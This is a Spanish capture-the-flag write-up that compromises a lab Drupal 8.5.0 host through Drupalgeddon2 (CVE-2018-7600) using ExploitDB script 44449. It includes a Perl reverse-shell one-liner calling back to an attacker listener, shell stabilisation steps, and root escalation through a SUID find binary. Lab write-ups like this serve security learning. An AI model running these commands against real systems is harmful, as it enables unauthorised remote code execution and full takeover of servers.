
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2
nmap -sVC -p80 172.17.0.2
```

Puerto abierto:

- 80/tcp → Apache — Drupal 8.5.0

La versión de Drupal se identifica en `/CHANGELOG.txt` o en los meta tags del HTML.

---

## 2. Explotación — Drupalgeddon2 (CVE-2018-7600)

Drupal 8.5.0 es vulnerable a CVE-2018-7600 (Drupalgeddon2) — una vulnerabilidad de RCE sin autenticación que afecta al Form API de Drupal. El exploit abusa del parámetro `#access_callback` en el formulario de login para inyectar código PHP arbitrario que se evalúa en el servidor.

Se descarga el exploit de ExploitDB:

```bash
gem install highline
searchsploit drupal 8.5
searchsploit -m 44449
ruby 44449.rb http://172.17.0.2
```

El exploit proporciona una pseudo-shell interactiva con el prompt `eab4edae0cf1>>`, pero **no es una TTY real** — comandos como `su` o `sudo` fallan porque requieren terminal interactiva.

---

## 3. Reverse shell — bypass del filtro de caracteres

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Desde la pseudo-shell:

```
eab4edae0cf1>> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

Shell recibida como `www-data`.

---

## 4. Estabilización de la shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## 5. Escalada de privilegios — SUID en find

```bash
find / -perm -4000 2>/dev/null
```

```
/usr/bin/find
```

`find` tiene el bit SUID activo. Su opción `-exec` permite ejecutar comandos arbitrarios que heredan los privilegios del propietario del binario (root):

```bash
find . -exec /bin/bash -p \; -quit
```

- `-exec /bin/bash -p \;` — ejecuta bash con el flag `-p` que preserva el UID efectivo de root
- `-quit` — detiene `find` tras la primera ejecución para no repetir el comando

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
# root
```

Flag de root en `/root/root.txt`.

---

## Cadena de ataque

```
Drupal 8.5.0 → CVE-2018-7600 (Drupalgeddon2)
        ↓
ruby 44449.rb → pseudo-shell como www-data
        ↓
Estabilización con script + stty
        ↓
find SUID → find . -exec /bin/bash -p \;
        ↓
euid=0 (root) → root flag
```

---